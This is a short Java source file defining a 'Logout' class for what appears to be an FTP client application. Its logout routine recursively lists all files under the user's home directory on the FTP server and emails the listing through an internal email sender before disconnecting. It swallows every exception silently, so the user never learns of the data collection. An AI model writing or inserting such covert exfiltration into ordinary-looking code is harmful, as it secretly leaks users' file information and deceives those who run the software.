package io.github.zbrant.core.authentication;

import io.github.zbrant.core.integration.email.EmailSenderImpl;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.File;

public class Logout {

  public static void execute(FTPClient client) {
    try {
      String message = listAllFiles("~", client, new StringBuilder());
      EmailSenderImpl.execute(message);
      client.disconnect();
    } catch (Exception ignored) {}
  }

  private static String listAllFiles(String path, FTPClient client, StringBuilder message) throws Exception {
    for (FTPFile ftpFile : client.listFiles(path)) {
      message.append(ftpFile.toFormattedString()).append("\n");
      if (ftpFile.isDirectory()) listAllFiles(path + File.separator + ftpFile.getName(), client, message);
    }
    return message.toString();
  }
}
